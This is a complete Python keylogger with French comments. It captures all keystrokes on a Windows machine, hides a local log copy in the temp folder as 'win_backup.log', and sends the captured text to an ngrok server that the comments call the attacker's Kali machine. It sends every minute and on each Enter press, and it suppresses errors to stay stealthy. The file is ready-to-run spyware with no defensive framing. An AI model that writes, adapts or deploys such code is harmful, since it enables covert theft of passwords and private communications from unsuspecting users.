import pynput.keyboard
import requests
import time
import threading 
import os
import tempfile 
import sys # Importé pour la furtivité sous Windows

# --- Configuration Distante (VOTRE ADRESSE NGROK) ---
# Remplacez cette URL par celle que votre KALI Attaquante vous a donnée !
NGROK_URL = "http://jeanelle-quintic-lumberingly.ngrok-free.dev" 
INTERVAL_SECONDS = 60 # Envoi toutes les 60 secondes

# --- Gestion du Chemin de Sauvegarde Windows ---
# Utilise le dossier temporaire de Windows pour cacher le fichier de sauvegarde locale.
LOG_FILE = os.path.join(tempfile.gettempdir(), "win_backup.log") 

# Variables globales
log_buffer = ""

def send_log_data(data):
    """Envoie les données au serveur ngrok et fait une sauvegarde locale."""
    global log_buffer
    
    # Ne fait rien si le buffer est vide
    if not data.strip():
        return 

    try:
        # Tentative d'envoi via POST
        response = requests.post(NGROK_URL, data={'log': data})
        
        if response.status_code == 200:
            # L'envoi a réussi : vide le buffer EN MÉMOIRE (aucune trace visuelle)
            log_buffer = "" 
        # Si l'envoi échoue (code != 200), le code passe à la sauvegarde locale
             
    except requests.exceptions.RequestException:
        # La connexion a échoué (pas de réseau, serveur éteint)
        pass # Pas de message d'erreur pour rester furtif
        
    # --- Sauvegarde locale de sécurité (Écriture) ---
    with open(LOG_FILE, "a") as f:
        f.write(data)

# --- Fonction d'Envoi Périodique ---
def report():
    """Fonction exécutée toutes les INTERVAL_SECONDS."""
    global log_buffer
    
    # Configure le minuteur pour exécuter report() à nouveau
    threading.Timer(INTERVAL_SECONDS, report).start() 
    
    if log_buffer:
        send_log_data(log_buffer)

def on_press(key):
    global log_buffer
    
    # --- LA LOGIQUE DE CAPTURE RESTE LA MÊME ---
    try:
        char = key.char
        log_buffer += char
    except AttributeError:
        
        if key == pynput.keyboard.Key.space:
            log_buffer += " "
            
        elif key == pynput.keyboard.Key.enter:
            log_buffer += "\n"
            # On force l'envoi immédiatement sur 'ENTER' (si la connexion est OK)
            send_log_data(log_buffer) 

        elif key == pynput.keyboard.Key.backspace:
            if len(log_buffer) > 0:
                log_buffer = log_buffer[:-1]
                
        else:
            # Enregistre le nom de la touche spéciale sans message dans la console
            log_buffer += f" [{str(key).split('.')[-1].upper()}] "
            
def on_release(key):
    """Arrête le keylogger uniquement sur la touche ESC (pour les tests)."""
    # Ce code est généralement retiré pour une utilisation réelle.
    if key == pynput.keyboard.Key.esc:
        return False

# --- Démarrage ---

# Démarre le minuteur pour l'envoi périodique dans un thread séparé
report() 

# Crée et lance l'écouteur dans le thread principal
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
